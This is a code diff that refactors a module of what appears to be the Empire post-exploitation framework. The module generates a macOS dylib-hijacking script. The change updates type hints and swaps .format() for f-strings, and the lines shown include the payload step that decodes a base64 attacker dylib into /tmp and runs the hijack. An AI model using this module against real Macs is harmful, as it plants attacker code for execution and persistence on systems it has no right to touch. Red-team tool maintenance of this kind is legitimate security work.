@@ -1,6 +1,6 @@
 import base64
-from typing import Dict, Optional, Tuple
 
+from empire.server.common.empire import MainMenu
 from empire.server.core.module_models import EmpireModule
 from empire.server.utils.string_util import removeprefix, removesuffix
 
@@ -8,12 +8,12 @@ from empire.server.utils.string_util import removeprefix, removesuffix
 class Module:
     @staticmethod
     def generate(
-        main_menu,
+        main_menu: MainMenu,
         module: EmpireModule,
-        params: Dict,
+        params: dict,
         obfuscate: bool = False,
         obfuscation_command: str = "",
-    ) -> Tuple[Optional[str], Optional[str]]:
+    ) -> tuple[str | None, str | None]:
         # the Python script itself, with the command to invoke
         #   for execution appended to the end. Scripts should output
         #   everything to the pipeline for proper parsing.
@@ -41,7 +41,7 @@ class Module:
         dylib = params["LegitimateDylibPath"]
         vrpath = params["VulnerableRPATH"]
 
-        script = """
+        script = f"""
 from ctypes import *
 def run(attackerDYLIB):
 
@@ -414,9 +414,9 @@ def run(attackerDYLIB):
 
 
     #target .dylib
-    targetDYLIB = "{}"
+    targetDYLIB = "{dylib}"
 
-    vrpath = "{}"
+    vrpath = "{vrpath}"
 
 
     #configured .dylib
@@ -467,7 +467,7 @@ def run(attackerDYLIB):
 
 import base64
 import uuid
-encbytes = "{}"
+encbytes = "{encoded_dylib}"
 filename = str(uuid.uuid4())
 path = "/tmp/" + filename + ".dylib"
 decodedDylib = base64.b64decode(encbytes)
@@ -475,10 +475,6 @@ temp = open(path,'wb')
 temp.write(decodedDylib)
 temp.close()
 run(path)
-""".format(
-            dylib,
-            vrpath,
-            encoded_dylib,
-        )
+"""
 
         return script
